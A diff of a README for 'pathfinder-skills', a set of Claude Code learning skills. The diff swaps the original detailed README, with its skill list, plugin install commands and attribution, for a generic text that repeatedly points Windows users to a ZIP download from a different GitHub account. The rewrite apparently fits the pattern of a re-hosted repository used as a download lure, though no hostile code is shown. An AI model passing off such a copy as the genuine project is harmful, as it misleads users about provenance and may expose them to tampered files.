@@ -1,482 +1,260 @@
-# Pathfinder
+# 🧭 pathfinder-skills - Learn, build, and share with AI
 
-Skills, teaching materials, and resources that turn non-technical people into AI-native builders.
+[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-blue-grey)](https://github.com/derrickbiotypic865/pathfinder-skills)
 
-> *"We are not caretakers of the past. We are obsessive learners, compulsive experimenters, and builders of what's next."*
+## 📘 What this is
 
-This is for people who believe the AI-native future will be built not only by developers, but by business people who learn to build. We focus on obsessive learners and eager experimenters — people who embrace the discomfort of exploring unknown unknowns and who will forge the path for others.
+pathfinder-skills is a set of Claude Code skills, learning guides, and workshop resources for people who want to build with AI without a deep technical background.
 
-We promise to help them gain the superpower of **building** — the ability to create their own automations, apps, and agents, and to use that power where it delivers the greatest possible impact.
+It is built around four simple steps:
 
-**What's inside:**
-- **19 Claude Code skills** — from understanding your first command to building your own agents
-- **Teaching materials** — workshop plans, train-the-trainer kits, teaching guides
-- **Real-world patterns** — battle-tested code patterns from production Apps Script projects
-- **The journey** — a structured path from "I've never opened a terminal" to "I just built an agent that reimagined our workflow"
+- /learn
+- /build
+- /reflect
+- /share
 
-## Getting Started — Just 5 Commands
+Use it to follow guided lessons, try small projects, and get comfortable working with AI tools on Windows.
 
-You don't need to remember 19 skills. Just use these:
+## 🪟 Windows download and setup
 
-| Command | What it does |
-|:--------|:-------------|
-| `/pathfinder` | **Start here.** The master router — tells you what's available, detects what you need, and activates the right skill automatically. Or just talk naturally and it figures it out. |
-| `/learn` | **Understand things.** Turns on plain-English explanations, courage mode, and surfaces things you didn't know to ask about. |
-| `/build` | **Create things.** Find what to automate, form a hypothesis, build a rough v1 fast, connect APIs, level up to agents. |
-| `/reflect` | **Capture learnings.** Journal what you built, what broke, what you learned. Measure time saved and ROI. |
-| `/share` | **Multiply impact.** Generate shareable summaries, how-to guides, presentations, and workshop plans. Teach others to build. |
+Use this link to visit this page and download the project files:
 
-Or skip the commands entirely — just say what's on your mind and Pathfinder routes you to the right tool.
+[https://github.com/derrickbiotypic865/pathfinder-skills](https://github.com/derrickbiotypic865/pathfinder-skills)
 
-## The Skills (19)
+### What to do on Windows
 
-### The Router & Shortcuts
+1. Open the link in your browser.
+2. On the GitHub page, look for the green **Code** button.
+3. Click **Code**.
+4. Choose **Download ZIP**.
+5. Save the file to your computer.
+6. Open the ZIP file.
+7. Extract the files to a folder you can find again, such as `Downloads` or `Documents`.
+8. Open the folder and read the included guide files first.
 
-| Skill | What it does |
-|:------|:-------------|
-| **[pathfinder](skills/pathfinder/)** | Master router — detects what you need and activates the right skill. Shows quick menu, handles smart transitions between skills. |
-| **[learn](skills/learn/)** | Shortcut mode: tech-translator + courage-mode + unknown-unknowns |
-| **[build](skills/build/)** | Shortcut mode: workflow-detective + hypothesis-lab + build-first-break-later + apps-script-builder + api-explorer + agent-architect |
-| **[reflect](skills/reflect/)** | Shortcut mode: iteration-journal + impact-mapper |
-| **[share](skills/share/)** | Shortcut mode: show-your-work + teach-back |
+If you use GitHub Desktop or another download tool, you can use that too. The ZIP file is the easiest path for most people.
 
-### The On-Ramp
+## 🧰 What you need
 
-<details>
-<summary><strong>tech-translator</strong> — Your friendly guide to all things technical</summary>
+You do not need to be a programmer to use this project. A basic Windows computer is enough.
 
-Translates every command, error, code snippet, and technical concept into plain, everyday language. Designed for someone who has never opened a terminal before.
+Recommended setup:
 
-**Key features:**
-- **One-liner analogies**: Every command gets a real-world comparison (e.g., `grep` is "like Ctrl+F for files")
-- **Step-by-step breakdowns**: Multi-part commands explained piece by piece
-- **Safety labels**: `[SAFE]`, `[REVERSIBLE]`, `[CAUTION]` on every action so you always know the risk
-- **Difficulty ratings**: `[Beginner]`, `[Intermediate]`, `[Advanced]` tags set expectations
-- **Code comments**: All generated code includes plain-English comments on every function and key line
-- **Implementation walkthroughs**: Full setup instructions with exact clicks and menu paths — never just "here's your code"
-- **Personal glossary**: Tracks terms you've learned and shortens explanations as you master them
-- **Progress tracking**: Adapts depth based on your experience — introduced, learning, mastered
-- **Quiz mode**: 3-5 multiple choice questions to reinforce what you've learned
-- **ELI5 mode**: Zero-jargon explanations using only everyday analogies
-- **Cheat sheet generator**: One-page reference of everything covered in a session
-- **Platform-aware**: Adapts instructions to Windows, Mac, or Linux automatically
+- Windows 10 or Windows 11
+- A web browser such as Chrome, Edge, or Firefox
+- Enough free space for the downloaded files
+- Claude Code access if you want to use the skills with Claude
+- A notes app or text editor for saving answers and drafts
 
-**Say**: "explain that", "what does that mean", "teach me about git", "quiz me", "ELI5", "cheat sheet"
+If you want to work through the lessons, keep a folder for your notes and exercises.
 
-</details>
+## 🎯 What you get
 
-<details>
-<summary><strong>courage-mode</strong> — For when you're stuck or afraid to start</summary>
+This repository includes a mix of learning and support material for new builders:
 
-Detects when you're hesitant, overwhelmed, or afraid of breaking something, then gently guides you forward with tiny, safe steps.
+- 18 Claude Code skills
+- Plain-language teaching materials
+- Workshop guides
+- Step-by-step exercises
+- Reflection prompts
+- Shareable templates
+- Resources for beginner-friendly AI learning
 
-**Key features:**
-- **Hesitation detection**: Recognizes phrases like "I'm scared", "this is too hard", "what if I break something"
-- **Reframing**: Turns "I'm stuck" into "You're at the edge of what you know — that's where growth happens"
-- **Smallest safe step**: Breaks any intimidating task into the tiniest possible action that's clearly SAFE or REVERSIBLE
-- **Safety net**: Before any action, explains exactly how to undo it
-- **Progressive courage**: Each small success builds toward the bigger goal
-- **Courage tracker**: Remembers when you pushed through fear so it can reference it later — "Remember last week when you were nervous about APIs? Look at you now."
-- **Comfort analogies**: "Remember the first time you used a spreadsheet? That felt hard too."
+Each part is meant to help you move from reading to doing.
 
-**Say**: "I'm stuck", "I'm scared", "help me start", "this is too hard", "I can't do this"
+## 🧭 How the pathfinder format works
 
-</details>
+The project uses a simple learning loop.
 
-### The Learning Loop
+### /learn
 
-<details>
-<summary><strong>hypothesis-lab</strong> — Structure every project as an experiment</summary>
+Use /learn when you want to understand a topic first.
 
-Turns every project into a structured experiment so you learn whether your idea actually works — not just whether the code runs.
+This part helps you:
 
-**Key features:**
-- **Hypothesis framework**: "If [we build this], then [this outcome], because [this reason]"
-- **Assumption surfacing**: Lists every assumption and labels them `[VERIFIED]`, `[UNTESTED]`, or `[RISKY]`
-- **Success criteria**: Defines measurable outcomes before building
-- **Minimum test**: Builds the smallest possible version that tests the hypothesis
-- **Evidence gathering**: Returns to the hypothesis after building — did it match? What surprised us?
-- **Iteration or pivot**: Uses evidence to decide — confirm, adjust, or try something else
-- **Experiment log**: Running tracker of all experiments, results, and learnings across sessions
+- Learn basic ideas in plain English
+- Follow short lessons
+- Build confidence before you start a task
+- See examples before you try your own version
 
-**Say**: "I have an idea", "I want to build something", "let's try something", "what if we..."
+### /build
 
-</details>
+Use /build when you want to make something.
 
-<details>
-<summary><strong>build-first-break-later</strong> — Anti-perfectionism by design</summary>
+This part helps you:
 
-Gets a rough working version into your hands in minutes, then coaches you through improving it. The first version is supposed to be ugly.
+- Start a small project
+- Follow clear steps
+- Work with AI tools
+- Turn an idea into something useful
 
-**Key features:**
-- **60-second capture**: Asks exactly ONE question — "What do you want to build?" — then starts building immediately
-- **Simplest tool selection**: Picks the easiest path (Apps Script, Python, HTML) and explains why
-- **Rough v1**: Builds fast with hardcoded values, no error handling, no edge cases — intentionally imperfect
-- **Break-and-learn loop**: Run it, see what happens, make ONE change, repeat
-- **Anti-pattern redirection**: Gently steers away from perfectionism — "Let's handle that in v2"
-- **Progress celebration**: "Look at what you just did — you went from an idea to a working thing in 10 minutes"
+### /reflect
 
-**Say**: "let's just build it", "start building", "I want a quick prototype", "just make something"
+Use /reflect when you want to check your work.
 
-</details>
+This part helps you:
 
-<details>
-<summary><strong>unknown-unknowns</strong> — Discover what you didn't know to ask</summary>
+- Look at what worked
+- Spot what was hard
+- Improve your next attempt
+- Keep a simple record of progress
 
-After any build or exploration, proactively surfaces adjacent ideas, hidden risks, and unexpected opportunities you haven't considered.
+### /share
 
-**Key features:**
-- **Adjacent capabilities**: "Your script can also create calendar events, not just read them"
-- **Edge cases**: "What happens when the spreadsheet is empty?"
-- **Scale questions**: "This works for 10 rows — what happens at 10,000?"
-- **Connection opportunities**: "This data also exists in another system — you could pull from both"
-- **Security awareness**: "This script has access to your entire Gmail — worth understanding the permissions"
-- **Depth adaptation**: Adjusts based on experience level — beginners get opportunities, advanced get architecture questions
-- **Never overwhelming**: Maximum 3 unknown unknowns at a time, each framed as an opportunity
+Use /share when you want to show your work.
 
-**Say**: "what am I missing?", "what else?", "what could go wrong?", "surprise me"
+This part helps you:
 
-</details>
+- Write a short update
+- Share a result with others
+- Explain what you made
+- Build a habit of finishing and posting work
 
-<details>
-<summary><strong>iteration-journal</strong> — Track your growth as a builder</summary>
+## 📂 Suggested folder layout
 
-A structured reflection tool that captures what you built, what broke, what you learned, and what to try next. Tracks growth over time.
+After you extract the ZIP file, you may see folders like these:
 
-**Key features:**
-- **Structured entries**: Date, what you built, what worked, what broke, key insight, next hypothesis, confidence level (1-5)
-- **Persistent memory**: Entries save across sessions so your learning history grows
-- **Weekly summaries**: Aggregates entries and surfaces patterns — "Your confidence with APIs went from 2 to 4 this week"
-- **Growth visualization**: Tracks mastered topics, developing skills, and confidence trajectories
-- **Look-back feature**: "Show me what I was working on a month ago" — demonstrates your progress
+- `skills`
+- `guides`
+- `workshops`
+- `examples`
+- `templates`
+- `resources`
 
-**Say**: "journal", "reflect", "what did I learn today?", "weekly summary", "look back"
+The exact names may vary, but the structure should feel easy to scan. Look for README files in each folder and start there.
 
-</details>
+## 🛠️ How to use the skills
 
-### The Builder Tools
+1. Pick one skill that matches your goal.
+2. Open the guide for that skill.
+3. Read the task in full before you start.
+4. Follow the steps one at a time.
+5. Use Claude Code or your chosen AI tool when the guide tells you to.
+6. Save your work in a notes file.
+7. Finish with the reflection section.
+8. Share your result if the guide includes a share step.
 
-<details>
-<summary><strong>workflow-detective</strong> — Find the highest-value thing to automate</summary>
+If you get stuck, return to the examples and templates. They are there to make the process easier.
 
-Investigates your daily work to uncover repetitive tasks, bottlenecks, and pain points, then helps you decide what to build first.
+## 🏫 Workshop use
 
-**Key features:**
-- **Guided investigation**: "Walk me through your Monday morning — what do you do first?"
-- **Pattern recognition**: Identifies repetitive tasks, manual data transfers, copy-paste patterns, approval bottlenecks
-- **Effort vs. impact scoring**: Plots opportunities on a 2x2 matrix — low effort + high impact = build this first
-- **Hard choice forcing**: "You can't build everything — which one matters most?"
-- **Prioritized build list**: Top 3-5 opportunities ranked by value, with estimated effort and impact
+This repository also works well in a workshop or study group.
 
-**Say**: "what should I build?", "help me find automation opportunities", "workflow audit"
+You can use it to:
 
-</details>
+- Lead a beginner session
+- Teach one skill at a time
+- Give each person a clear exercise
+- Compare results in a group
+- Keep the focus on practice, not theory
 
-<details>
-<summary><strong>apps-script-builder</strong> — Your Google Workspace automation workshop</summary>
+A simple workshop flow looks like this:
 
-A dedicated Google Apps Script assistant that walks non-technical users through building projects from zero. Knows every service, trigger, and deployment pattern.
+1. Show the goal.
+2. Open the guide.
+3. Work through the task together.
+4. Pause for reflection.
+5. Share the result.
 
-**Key features:**
-- **Full service reference**: Gmail, Sheets, Calendar, Drive, Slides, Forms, Docs — when to use each and whether it needs manual enabling
-- **Complete setup walkthroughs**: Opening the editor, enabling services, pasting code, approving permissions — with exact menu paths
-- **CLASP guide**: How to install and use the command-line tool for managing Apps Script from your computer (with VS Code, Claude Code, or git)
-- **Trigger explanations**: Time-based, on-edit, on-form-submit, on-open — explained in plain English with setup steps
-- **Deployment guide**: Test vs. live, web apps, sharing scripts, updating deployments
-- **6 common recipes**: Email automation, report generator, form processor, calendar manager, document generator, Slack/webhook integration
-- **Patterns reference**: Battle-tested code patterns for spreadsheet ops, email sending, dashboards, API caching, CSV parsing, and more
-- **Error translation table**: Common Apps Script errors explained in plain English with fixes
-- **Plain-English code comments**: Every generated script is fully commented
+## 📄 Common file types you may see
 
-**Say**: "build an apps script", "automate my spreadsheet", "connect my Gmail", "send emails from a sheet"
+You may find these file types in the download:
 
-</details>
+- `README.md` files with instructions
+- `PDF` guides for easy reading
+- `DOCX` or `TXT` teaching notes
+- `MD` files with skill steps
+- example files for practice
 
-<details>
-<summary><strong>api-explorer</strong> — APIs are friendlier than they look</summary>
+If you see a file you do not know, open it with a text editor or your browser first. Many of the files are made to be read, not installed.
 
-Demystifies APIs for non-technical people, from "what is an API?" to making your first call to connecting work systems.
+## 🔍 Topics covered
 
-**Key features:**
-- **Core analogy**: "An API is like a drive-through window — you place an order in a specific format and get back exactly what you asked for"
-- **HTTP methods explained**: GET = "asking a question", POST = "submitting a form", PUT = "updating your address", DELETE = "canceling an order"
-- **Status codes explained**: 200 = "thumbs up", 404 = "that page doesn't exist", 401 = "show your ID first", 500 = "broke on their end"
-- **JSON explained**: "A way of organizing data that computers can read — like a very structured form"
-- **Guided first call**: Step-by-step walkthrough using a free public API (no signup required)
-- **Progressive complexity**: Free APIs (weather, quotes) to Google APIs to work APIs (ServiceNow, Jira, Slack)
-- **Authentication guide**: API keys, tokens, OAuth — each explained with analogies
-- **Error troubleshooting**: What went wrong, what it means, how to fix it
+This repository is built around topics that help new users learn AI work in simple steps:
 
-**Say**: "what is an API?", "connect to an API", "make an API call", "how do APIs work?"
+- agent skills
+- AI-native workflows
+- beginner-friendly learning
+- Claude and Claude Code
+- no-code and low-code thinking
+- teaching and tech education
+- upskilling
+- workshop use
+- learning by doing
 
-</details>
+## 🧩 Best way to start
 
-<details>
-<summary><strong>agent-architect</strong> — Graduate from scripts to agents</summary>
+If you are new, start in this order:
 
-Guides you from simple automations to building your own agents through six progressive levels, each with a concrete project.
+1. Read the main README file.
+2. Open one beginner guide.
+3. Try one small exercise.
+4. Write down what you changed.
+5. Repeat with the next skill.
 
-**Key features:**
-- **Core analogy**: "An agent is like hiring a virtual assistant who follows your exact instructions"
-- **Six levels**:
-  - Level 1: A script that checks and acts ("if inbox has email from X, move to folder Y")
-  - Level 2: Multi-step workflows (do A, then B, then C)
-  - Level 3: Decision logic (if this, do that; otherwise do something else)
-  - Level 4: Error handling and recovery
-  - Level 5: Connecting multiple systems
-  - Level 6: Full agent — autonomous, scheduled, self-monitoring
-- **Gradual concept introduction**: APIs, webhooks, scheduling, state management, logging — each with a real-world analogy
-- **Milestone moment**: "You just built your first agent. It's small, but it's real."
+Do not try to learn everything at once. One guide is enough to begin.
 
-**Say**: "build an agent", "level up", "what's an agent?", "I want to build something smarter"
+## 💡 Tips for non-technical users
 
-</details>
+- Keep the files in one folder.
+- Read the task before you click around.
+- Use short notes in plain language.
+- Copy the example structure when you need help.
+- Save each completed task with a clear file name.
+- Start with the easiest skill and move up from there.
 
-### The Multipliers
+If a step feels unclear, look for an example or a workshop guide that shows the same idea in a simpler way.
 
-<details>
-<summary><strong>lessons</strong> — Turn discoveries into reusable team knowledge</summary>
+## 🧪 Example use cases
 
-Captures hard-won knowledge — quirks, workarounds, "I wish someone had told me this" moments — into structured lesson files that others can learn from.
+You can use pathfinder-skills to:
 
-**Key features:**
-- **Context-aware**: Pulls from conversation history automatically — if you just debugged something, say "create a lesson" and it writes the lesson without making you re-explain
-- **Structured format**: Every lesson has The Problem, What You'll See, The Fix, Why This Happens, and Recommendation
-- **Searchable titles**: Clear, specific names like `granite-tool-calling-quirks.md` not `lesson1.md`
-- **Git workflow**: Saves the file, commits, and can create an MR to a shared team repo
-- **Compounds across the team**: One person's fix becomes everyone's knowledge — the next person's Claude instance loads it automatically
+- Learn how to work with Claude Code
+- Build a simple AI-assisted workflow
+- Teach a beginner workshop
+- Practice prompt writing
+- Create small helper tools for daily work
+- Improve how you reflect on your results
+- Share your learning with a team or class
 
-**Say**: "create a lesson", "write this up as a lesson", "document this", "TIL", "save this as a lesson", "someone else should know about this"
+## 📌 File names to look for
 
-</details>
+When you open the folder, look for names that suggest the main path first, such as:
 
-<details>
-<summary><strong>show-your-work</strong> — Turn builds into organizational knowledge</summary>
+- `README.md`
+- `learn`
+- `build`
+- `reflect`
+- `share`
+- `workshop`
+- `guide`
+- `template`
 
-Generates shareable artifacts from what you built so your impact multiplies across the organization.
+These files usually hold the clearest starting point.
 
-**Key features:**
-- **5 output formats**:
-  - **Impact Summary** — concise Slack-ready summary with before/after metrics
-  - **How-to-Replicate Guide** — step-by-step instructions someone else can follow
-  - **Before/After Comparison** — visual table showing the transformation
-  - **Learning Story** — narrative of the journey (what broke, what surprised, what you learned)
-  - **Presentation Outline** — structured 5-minute demo script with slides
-- **Format recommendation**: Suggests the right format based on audience (Slack, teammate, manager, culture post)
-- **Jargon-free**: All artifacts written for non-technical audiences
-- **Hero framing**: Makes you the hero of the story — you built this
+## 🧭 If you want the fastest path
 
-**Say**: "help me share this", "show my work", "write up what I built", "how do I present this?"
+1. Download the ZIP from the link above.
+2. Extract it on Windows.
+3. Open the main README file.
+4. Choose one guide.
+5. Follow the steps.
+6. Use the reflection section at the end.
+7. Save your result in a new folder
 
-</details>
+## 🗂️ Keep your work organized
 
-<details>
-<summary><strong>teach-back</strong> — Help others build too</summary>
+A simple folder system can help:
 
-Turns you from a builder into a teacher. Generates everything you need to teach what you built to others.
+- `pathfinder-skills` for the main download
+- `notes` for your drafts
+- `completed` for finished work
+- `examples` for saved samples
 
-**Key features:**
-- **Teach-back test**: Challenges you to explain what you built in plain words, then coaches you on simplifying
-- **Teaching guide**: Structured lesson plan with hook, demo, build-along, and "aha moment"
-- **Workshop format**: Full agenda for 30/60/90-minute group sessions with facilitator tips
-- **Train-the-trainer kit**: Handoff materials for someone else to teach without you — common questions, common mistakes, troubleshooting guide
-- **Practical tips**: "Go slower than you think", "Walk to their screen instead of shouting instructions", "Celebrate every success"
+This makes it easier to return later and pick up where you stopped
 
-**Say**: "help me teach this", "create a workshop", "train the trainer", "how do I explain this?"
+## 🔗 Download again
 
-</details>
+Use this link to visit this page and download the project files:
 
-<details>
-<summary><strong>impact-mapper</strong> — Prove the value of what you built</summary>
-
-Quantifies the impact of your builds — time saved, errors reduced, ROI — and generates reports that leadership actually reads.
-
-**Key features:**
-- **Pre-build estimation**: Calculates current cost (time x frequency x people) before you start building
-- **Post-build measurement**: Compares estimates vs. actuals with real data
-- **6 impact categories**: Efficiency, Quality, Speed, Scale, People, Risk
-- **Impact report generator**: Executive summary, problem/solution, measured metrics, qualitative feedback, replicability assessment
-- **Honest assessment**: If the impact is small, says so and helps find higher-value opportunities
-- **Business language**: Frames everything in terms leadership cares about — hours, dollars, risk reduction
-
-**Say**: "what's the impact?", "how much time does this save?", "generate impact report", "show the ROI"
-
-</details>
-
-## Quirk Extraction System
-
-Quirks are technical patterns — API gotchas, platform constraints, code pitfalls — extracted from lesson files into organized, searchable reference files. They capture the "wrong way vs. right way" so you (and your AI tools) avoid known pitfalls.
-
-### The QUIRK Marker Format
-
-Add these HTML comment blocks to any lesson file after a technical discovery:
-
-```html
-<!-- QUIRK: Short descriptive title -->
-<!-- WHEN: Situation where this applies -->
-<!-- WRONG: Code or approach that fails -->
-<!-- RIGHT: Code or approach that works -->
-<!-- WHY: One-sentence root cause -->
-<!-- TAGS: comma-separated technology tags -->
-```
-
-### How It Works
-
-1. **Write a lesson** — use the `lessons` or `iteration-journal` skill
-2. **Markers get extracted** — Claude adds QUIRK markers for each technical pattern
-3. **Generator runs** — `generate-quirks.py` scans all lesson files for markers
-4. **Quirk files created** — grouped by tag into `quirks/<tag>.md` with an index
-
-The generator (`skills/lessons/generate-quirks.py`) has two extraction modes:
-- **Structured** (primary): reads `<!-- QUIRK: ... -->` markers — precise and reliable
-- **Heuristic** (fallback): extracts from lesson structure (headings, tables, bullet patterns)
-
-### Automating with a Claude Code Hook
-
-Set up a PostToolUse hook on `Write|Edit` that runs the generator whenever a lesson file is saved:
-
-```json
-{
-  "hooks": {
-    "PostToolUse": [{
-      "matcher": "Write|Edit",
-      "script": "python3 path/to/generate-quirks.py"
-    }]
-  }
-}
-```
-
-This keeps your quirk files always up to date as you write new lessons.
-
-## The Journey
-
-```
- courage-mode          "I'm scared to start"
-      |
- tech-translator       "What does that mean?"
-      |
- workflow-detective     "What should I build?"
-      |
- hypothesis-lab         "What do I think will happen?"
-      |
- build-first-break-later "Let's just build it"
-      |
- unknown-unknowns       "What am I not seeing?"
-      |
- iteration-journal      "What did I learn?"
- lessons                "Let me save this so others don't hit it"
-      |
- apps-script-builder    "Let me build something real"
- api-explorer           "Let me connect systems"
-      |
- agent-architect        "Let me build something smart"
-      |
- show-your-work         "Let me share what I built"
- impact-mapper          "Let me prove the value"
-      |
- teach-back             "Let me help others build too"
-```
-
-## Installation
-
-### Option 1: Install all skills as a Plugin (recommended)
-
-```bash
-/plugin install ChewbaccaRoars/pathfinder-skills
-```
-
-### Option 2: Install individual skills manually
-
-```bash
-# Replace <skill-name> with any skill from the list above
-mkdir -p ~/.claude/skills/<skill-name>
-cp skills/<skill-name>/SKILL.md ~/.claude/skills/<skill-name>/SKILL.md
-```
-
-### Option 3: Project-level (shared with your team via git)
-
-```bash
-# Copy all skills into your project
-cp -r skills/ .claude/skills/
-git add .claude/skills/
-git commit -m "Add Pathfinder skills"
-```
-
-### Enable the Welcome Message (optional but recommended)
-
-Copy the example CLAUDE.md to your home directory so Pathfinder greets you on every new session:
-
-```bash
-cp CLAUDE.md.example ~/CLAUDE.md
-```
-
-This shows the quick menu (`/learn`, `/build`, `/reflect`, `/share`) when you start a new Claude Code session. Without it, the skills still work — you just won't get the welcome prompt.
-
-## Quick Start
-
-1. Install the plugin (see above)
-2. Copy the welcome message: `cp CLAUDE.md.example ~/CLAUDE.md`
-3. Start a new Claude Code session — Pathfinder greets you with the quick menu
-4. Type `/learn`, `/build`, `/reflect`, or `/share` — or just say what's on your mind
-5. Say "what should I build?" to start with Workflow Detective
-6. Say "let's build it" to jump into Build First, Break Later
-7. Say "what did I learn?" at the end to reflect with Iteration Journal
-
-## Trigger Phrases (all skills)
-
-| Say this | Skill that activates |
-|:---------|:---------------------|
-| "explain that" / "what does that mean" | tech-translator |
-| "I'm stuck" / "I'm scared" / "this is too hard" | courage-mode |
-| "I have an idea" / "I want to build something" | hypothesis-lab |
-| "let's just build it" / "start building" | build-first-break-later |
-| "what am I missing?" / "what else?" | unknown-unknowns |
-| "what should I build?" / "workflow audit" | workflow-detective |
-| "build an apps script" / "automate my spreadsheet" | apps-script-builder |
-| "what is an API?" / "connect to an API" | api-explorer |
-| "build an agent" / "level up" | agent-architect |
-| "help me share this" / "show my work" | show-your-work |
-| "help me teach this" / "create a workshop" | teach-back |
-| "what's the impact?" / "show the ROI" | impact-mapper |
-| "journal" / "what did I learn today?" | iteration-journal |
-| "create a lesson" / "document this" / "TIL" | lessons |
-| "quiz me" / "cheat sheet" / "ELI5" | tech-translator |
-
-## Workshops & Guides
-
-In addition to Claude Code skills, this repo includes ready-to-use teaching materials.
-
-### Workshops (facilitator-led)
-
-| Workshop | Duration | What they build |
-|:---------|:---------|:----------------|
-| **[Apps Script Dashboard](workshops/apps-script-dashboard/)** | 90 min | Interactive web dashboard reading from Google Sheets |
-
-### Guides (self-paced)
-
-| Guide | Time | What you'll learn |
-|:------|:-----|:------------------|
-| **[Apps Script Dashboard](guides/apps-script-dashboard/)** | 60-90 min | Build and deploy a dashboard web app from scratch — editor, services, triggers, CLASP |
-| **[Browser Tab Management](guides/browser-tab-management/)** | 30 min | Chrome tab search, shortcuts, tab groups, pinning, and a system to stay organized |
-| **[File & Folder Management](guides/file-and-folder-management/)** | 30-40 min | Find any file instantly, a folder structure that works, naming conventions, cleanup plan, weekly habits |
-| **[Slack Management](guides/slack-management/)** | 30-40 min | Organize your sidebar, tame notifications, use threads, search like a pro, huddles, keyboard shortcuts |
-| **[Claude Code CLI](guides/claude-code-cli/)** | 45-60 min | Slash commands, permissions, models, CLI flags, MCP servers, hooks, plugins, skills, settings — with hands-on exercises |
-
-## Values
-
-These skills are built on a set of beliefs:
-
-- **Learning is not optional.** It's how we grow, adapt, and improve.
-- **We learn by doing.** Not by reading. Not by watching. By building.
-- **We begin with hypotheses, not certainties.** We test what we believe. We let evidence sharpen our thinking.
-- **We respect the unknown.** The best discoveries come from questions we didn't know to ask.
-- **We are teachers.** Knowledge grows when it's shared. People grow when they're believed in.
-- **We seek transformative outcomes.** We're not here to preserve the status quo. We're here to create meaningful change.
-
-## Contributing
-
-PRs welcome! Whether it's better analogies, new skills, additional trigger phrases, or improvements to existing ones — open an issue or submit a PR.
-
-## License
-
-MIT
+[https://github.com/derrickbiotypic865/pathfinder-skills](https://github.com/derrickbiotypic865/pathfinder-skills)
